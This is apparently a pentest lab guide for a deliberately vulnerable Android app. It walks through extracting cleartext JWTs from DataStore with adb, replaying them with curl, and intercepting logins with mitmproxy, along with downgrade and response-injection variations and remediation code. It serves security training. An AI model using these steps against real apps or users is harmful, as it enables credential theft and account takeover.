# M1 — Improper Credential Usage · VulnMNO Pentest Guide

This guide documents **pre-existing M1 weaknesses** that ship with the current
VulnMNO Android build. No code is added for these labs — the vulnerabilities
are already present in the codebase and are catalogued here so trainees can
practise locating, exploiting, and remediating them.

> Scope: only the **debug** variant of `com.vulnmno.app` is in scope. The
> release variant is intentionally hardened and should be used as the "after"
> picture during remediation discussions.

OWASP MASVS reference: M1 — Improper Credential Usage. The two labs below map
to two distinct subcategories of M1:

| Lab | Subcategory                        | Severity | Difficulty |
|-----|------------------------------------|----------|------------|
| L2  | Insecure Credential Storage        | High     | Easy       |
| L3  | Insecure Credential Transmission   | High     | Easy       |

---

## L2 — Tokens stored in cleartext DataStore

### Where it lives

- **File:** `src/mobile/android/app/src/main/java/com/vulnmno/app/data/local/TokenStore.kt`
- **On-device path:** `/data/data/com.vulnmno.app/files/datastore/vulnmno_auth.preferences_pb`
- **Keys leaked:** `access`, `refresh`, `last_msisdn`

### Why it is M1

`TokenStore` is the single source of truth for the user's JWT access token and
refresh token after a successful login (and after every silent refresh handled
by `TokenAuthenticator`). It persists both tokens via Jetpack
`androidx.datastore.preferences` — a plain Protobuf-backed preferences file
written under the app's private data directory.

This violates the M1 guidance:

> *Do not store user credentials on the device. Instead, consider using secure,
> revocable access tokens.* — and even when access tokens are used, they must
> be protected at rest.

Two failure modes are stacked:

1. **No encryption at rest.** The file is written by the platform with
   `0600` perms but the bytes themselves are not encrypted. There is no
   `EncryptedSharedPreferences`, no `MasterKey` from the Android Keystore, and
   no platform-level `BiometricPrompt`/`KeyGenParameterSpec` binding. An
   attacker with any form of read access to the private data directory walks
   away with usable bearer tokens.
2. **No revocation hook on extraction.** The token TTL is server-side only.
   Once exfiltrated, the access token is valid until it expires and the
   refresh token is valid until it is rotated by another login — which the
   victim has no reason to trigger.

### How to find it (static analysis)

```bash
# 1) Pull the APK from a device or build it locally.
adb shell pm path com.vulnmno.app
adb pull /data/app/.../base.apk

# 2) Decompile.
apktool d base.apk -o vulnmno-decoded
# or for Java pseudocode:
jadx -d vulnmno-jadx base.apk

# 3) Grep for credential-handling primitives.
grep -RIn "preferencesDataStore\|stringPreferencesKey\|EncryptedSharedPreferences" vulnmno-jadx/sources/
```

Expected hit: a `TokenStore` class using `preferencesDataStore(name = "vulnmno_auth")`
with no `EncryptedSharedPreferences` or Keystore-backed wrapping in sight.

That alone is enough to file the finding. Confirm with a dynamic extraction.

### How to exploit (dynamic — rooted device or debug build)

The debug variant is built with `android:debuggable="true"`, which makes
`run-as` available without root.

```bash
# Authenticate normally in the app first (any seeded user, e.g. +34600000001).
# Then on the host:

adb shell run-as com.vulnmno.app ls -la files/datastore/
# -rw-------  vulnmno_auth.preferences_pb

# Copy out the prefs file.
adb shell run-as com.vulnmno.app cat files/datastore/vulnmno_auth.preferences_pb > prefs.pb

# It's protobuf with the string values left visible as ASCII.
strings prefs.pb
# access
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIi...    <-- JWT access token
# refresh
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIi...    <-- JWT refresh token
# last_msisdn
# +34600000001
```

For a properly typed decode:

```bash
protoc --decode_raw < prefs.pb
```

### Replay path

Once you have the access token, hit the backend directly — no app needed:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
     http://<backend>:8000/api/v1/customers/me
```

If the access token has expired, replay the refresh token instead:

```bash
curl -X POST http://<backend>:8000/api/v1/auth/refresh \
     -H "Content-Type: application/json" \
     -d '{"refreshToken":"eyJhbGciOi..."}'
```

You will receive a fresh access/refresh pair as if you were the victim, and
the victim's app will keep working unaware (refresh tokens are not bound to
a device fingerprint).

### Variations to try

- **Adb backup** (`adb backup -f vuln.ab -noapk com.vulnmno.app`) — works if
  the manifest does not set `android:allowBackup="false"`. Check
  `AndroidManifest.xml` after decoding the APK.
- **Physical access without USB debugging.** On older Android versions or
  vendor builds with weak FDE, an offline image of the userdata partition
  reveals the same preferences file.
- **Override via debug builds.** Any malicious app installed alongside that
  abuses an exposed `ContentProvider`/file-uri leak ends up with the same
  bytes. (Out of scope for L2 itself but a natural pivot.)

### Remediation (the "after" picture)

The minimal fix is to wrap the DataStore with a Keystore-backed key:

```kotlin
// EncryptedSharedPreferences variant — simpler than rolling your own.
val masterKey = MasterKey.Builder(ctx)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val prefs = EncryptedSharedPreferences.create(
    ctx, "vulnmno_auth", masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM,
)
```

Plus, server-side: bind refresh tokens to a device fingerprint and rotate them
on every use so a stolen refresh can be invalidated by the victim's next login.

---

## L3 — Cleartext HTTP permitted globally (debug variant)

### Where it lives

- **File:** `src/mobile/android/app/src/debug/res/xml/network_security_config.xml`
- **Referenced by:** `app/src/main/AndroidManifest.xml` →
  `android:networkSecurityConfig="@xml/network_security_config"`
- **Sourceset precedence:** the `debug/` resource overrides the `main/` one
  during `mergeDebugResources`, so this file is the effective policy in any
  debug APK.

### Why it is M1

The debug network security config sets:

```xml
<base-config cleartextTrafficPermitted="true">
    <trust-anchors>
        <certificates src="system" />
        <certificates src="user" />
    </trust-anchors>
</base-config>
```

Two distinct M1 violations stack here:

1. **`cleartextTrafficPermitted="true"` with no `<domain-config>` scoping.**
   The debug variant policy permits plain HTTP to **any** host the runtime
   chooses — including whatever the user types into the login screen's
   "Physical device?" affordance. **Stage 16 changed the compile-time
   default to `BASE_URL_DEBUG=https://10.0.2.2/` so a fresh install no
   longer leaks credentials over the wire**, but the *policy* still allows
   the downgrade. Two ways for a trainee to actually trigger cleartext on
   this build:
   - **Runtime override → `http://` URL.** Type `192.168.1.42:8000` in
     "Physical device?"; per the [`BaseUrlInterceptor`
     truth table](#L3-runtime-truth-table), an explicit `:8000` is
     interpreted as plain HTTP to the backend's direct port (the M3
     downgrade path).
   - **Rebuild with a build-time property.** `./gradlew assembleDebug
     -PBASE_URL_DEBUG=http://192.168.1.42:8000` reverts the default. Or
     edit `app/build.gradle.kts` directly.
   In either case, the resulting traffic — `POST /api/auth/login` with
   `{msisdn, password}` in the body and `Authorization: Bearer …` on every
   authenticated request — flows in clear because the network security
   policy never says "no".
2. **`<certificates src="user" />` is trusted (debug *and* main since
   stage 16).** Any CA the user (or an attacker who tricked the user)
   imported into the user trust store is considered valid. This is the
   **single biggest reason MITM proxying still works on Android 7+**:
   drop the proxy's CA into user certs and TLS interception is
   transparent. Stage 16 *intentionally* propagated this to the main
   policy so trainees can install the Caddy local CA and reach the
   backend over HTTPS — the cost is that the release variant is now
   also susceptible to user-CA MITM (no certificate pinning).

The "main" / release `network_security_config.xml` (post stage 16)
forbids cleartext entirely (`cleartextTrafficPermitted="false"`) and
relies on TLS via the Caddy reverse-proxy. So in a release APK the L3
exploit path collapses to "convince the victim to install a malicious
CA" — still M1, but a noisier social-engineering step.

### How to find it (static analysis)

```bash
# After apktool decoding:
cat vulnmno-decoded/AndroidManifest.xml | grep -A1 networkSecurityConfig
cat vulnmno-decoded/res/xml/network_security_config.xml
```

Red flags to call out in the report:

- `cleartextTrafficPermitted="true"` at the base-config level (unscoped)
  — debug variant only since stage 16; main variant now explicitly says
  `false`.
- `<certificates src="user" />` inside `<trust-anchors>` — debug **and**
  main since stage 16. The release APK is therefore MITM-able by any
  user-installed CA, no cert pinning.
- `android:usesCleartextTraffic="true"` on `<application>` — **removed in
  stage 16**. If a forensic image of an older build still shows it,
  flag it; current code does not declare it.

<a id="L3-runtime-truth-table"></a>
`BaseUrlInterceptor.normalize()` truth table (post stage 16) — the
seam where the runtime override gets resolved into a concrete URL:

| User types | Resolved URL | Effect on traffic |
|---|---|---|
| `192.168.1.42` | `https://192.168.1.42:443` | Goes through Caddy; encrypted. |
| `192.168.1.42:443` | `https://192.168.1.42:443` | Same as above, explicit. |
| `192.168.1.42:8000` | `http://192.168.1.42:8000` | **Cleartext**. Direct to backend, bypasses Caddy. The downgrade lab. |
| `http://host[:port]` | as typed | **Cleartext** if no port-443 hint. |
| `https://host[:port]` | as typed | Encrypted. |

### How to exploit (dynamic — MITM on local Wi-Fi)

Setup assumes phone and laptop on the same Wi-Fi. Adjust the IP for your
network.

```bash
# 1) Start mitmproxy in transparent or regular mode.
mitmproxy --listen-port 8080 --mode regular

# 2) On the phone: Settings → Wi-Fi → (network) → Modify → Proxy → Manual
#    Host: <laptop-ip>   Port: 8080

# 3) Browse to http://mitm.it on the phone and install the mitmproxy CA
#    into "user credentials". Because src="user" is trusted by the debug
#    config, the app will accept it.

# 4) (Optional) Even if the target backend is plain HTTP, leave HTTPS-capable
#    too — the "Physical device?" override accepts https:// too and mitmproxy
#    intercepts both transparently.

# 5) In the VulnMNO app: log in normally.
```

What you will see in the mitmproxy flow list:

```
POST  http://192.168.1.x:8000/api/v1/auth/login
{
  "msisdn":"+34600000001",
  "password":"Password1!"          <-- credentials in clear
}

200 OK
{
  "accessToken":"eyJhbGciOi...",   <-- token in clear
  "refreshToken":"eyJhbGciOi..."
}

GET   http://192.168.1.x:8000/api/v1/customers/me
Authorization: Bearer eyJhbGciOi...   <-- bearer in clear on every request
```

### Replay / lateral abuse

- Capture the bearer once, replay from `curl` as in L2.
- Capture the refresh token once, mint indefinite sessions until server-side
  rotation kicks in.
- Capture a `POST /api/v1/auth/password-reset/confirm` to harvest the new
  password before the victim ever uses it (the request body carries
  `newPassword` in clear).
- Modify response bodies in flight: e.g. inject a fake support phone number
  into `GET /api/v1/support/contact` and phish the victim out-of-band.

### Variations to try

- **Downgrade via the override.** Post stage 16 the default is HTTPS,
  but typing `192.168.1.42:8000` in "Physical device?" reverts to plain
  HTTP — no CA install required, ARP-spoof or rogue AP is enough.
- **Rebuild downgrade.** `./gradlew assembleDebug
  -PBASE_URL_DEBUG=http://192.168.1.42:8000` produces an APK that
  defaults to cleartext. Trainees can also rewrite the literal in
  `BuildConfig` after `apktool d` and re-pack.
- **DNS rebinding via the override.** The "Physical device?" affordance
  accepts any host the user types; coax a victim into pointing the app at
  an attacker-controlled host and credentials are posted directly to the
  attacker, no MITM needed.
- **Logcat side-channel.** `HttpLoggingInterceptor.Level.BASIC` is enabled in
  debug, so request URLs and status codes also leak to `adb logcat` (raise
  the level to `BODY` in your own fork and bodies leak too). This is a
  side-effect, not the core L3 finding, but worth noting.

### Remediation (the "after" picture)

For any non-emulator usage the network security config should be:

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
            <!-- NO user-installed CAs -->
        </trust-anchors>
    </base-config>
</network-security-config>
```

Plus:

- Terminate TLS at the backend (or a reverse proxy in front of it) and
  publish the real cert. The "Physical device?" override should reject
  `http://` schemes when the build is not debuggable.
- Add certificate pinning via OkHttp's `CertificatePinner` for the production
  base URL — defends against rogue CAs being added to the system store.
- Drop `android:usesCleartextTraffic="true"` from `<application>` in release.

---

## Suggested lab flow for trainees

1. **Recon.** `apktool d` + `jadx` the debug APK. Identify L2 in
   `TokenStore.kt` and L3 in `network_security_config.xml` purely by reading.
2. **L3 first** — set up mitmproxy, capture a login, extract the bearer from
   the wire. Document the exact request that carried the password.
3. **L2 second** — using the *same* victim session, pull the DataStore prefs
   via `adb run-as`, extract the refresh token, mint a fresh access token via
   `/api/v1/auth/refresh` without ever knowing the password.
4. **Compare the two paths.** L3 needs a network position; L2 needs device
   access. Both end at the same place (account takeover) — that is the M1
   lesson. Credentials must be defended at both points of presence.
5. **Write the remediation diff.** Trainees produce the patched
   `network_security_config.xml` and a sketch of the
   `EncryptedSharedPreferences`-based `TokenStore`. Re-run steps 2 and 3
   against the patched build to verify both attacks fail.
